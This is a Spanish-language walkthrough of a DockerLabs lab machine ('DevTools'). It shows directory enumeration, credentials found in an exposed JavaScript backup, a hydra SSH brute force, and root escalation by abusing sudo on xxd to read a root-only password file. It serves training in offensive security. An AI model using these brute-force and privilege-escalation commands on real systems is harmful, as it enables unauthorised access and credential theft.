## Introducción

Este documento presenta la resolución completa de la máquina **DevTools**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web que contiene un archivo JavaScript de backup (`backupp.js`) con credenciales hardcodeadas y una contraseña antigua. Aunque las credenciales directas no funcionan, la contraseña antigua permite un ataque de fuerza bruta dirigido, obteniendo acceso SSH como el usuario `carlos`.
Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `xxd` como root. Esto permite leer archivos restringidos como `/root/data.bak`, que contiene la contraseña de `root`, completando la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip DevTools.zip
sudo bash auto_deploy.sh DevTools.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p DevTools/{content,exploits,nmap,scripts}
cd DevTools
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1765863328/Ports_uxc3yr.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://172.17.0.2 -d 0 \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x php,txt,html,js,bak,old \
  -t 40 -C 404,403
```

![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1765863327/Feroxbuster_tvwe6s.png)

**Rutas relevantes:**
- `/index` — Página principal.
  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1765863328/Idex_vraw2y.png)
- `/backupp.js` — Archivo JavaScript de backup expuesto.
  ![Code](https://res.cloudinary.com/dewqswzke/image/upload/v1765863327/Code_bdsbzb.png)

### 1.4 Análisis del archivo JavaScript

El archivo `/backupp.js` contiene credenciales hardcodeadas:

```javascript
let user = "chocolate";
let password = "chocolate";
let old_password = "baluleroh";
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Fuerza bruta dirigida

Las credenciales directas `chocolate:chocolate` no funcionan. Se realiza un ataque de fuerza bruta con la contraseña antigua `baluleroh`:

```bash
hydra -L usuarios.txt -p baluleroh ssh://172.17.0.2 -I -t 64
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1765863327/HydraResult_hkjivq.png)

Se obtiene acceso con `carlos:baluleroh`:

```bash
ssh carlos@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1765863330/SSH_euo0ew.png)

---

## Paso 3 — Escalada de privilegios

### 3.1 De carlos → root

Se encuentra el archivo `nota.txt` que revela la existencia de un backup en `/root/data.bak`:

![Nota](https://res.cloudinary.com/dewqswzke/image/upload/v1765863328/Nota_tfjp4j.png)

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1765863330/Sudo-l_v1sfbr.png)

Se puede ejecutar `xxd` como root sin contraseña. Se usa para leer el archivo de backup:

```bash
sudo xxd -p /root/data.bak | xxd -p -r
```

![Xxd](https://res.cloudinary.com/dewqswzke/image/upload/v1765863330/Xxd_nypb5u.png)

Se obtiene la contraseña de `root`:

```bash
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1765863329/Root_lqik1r.png)
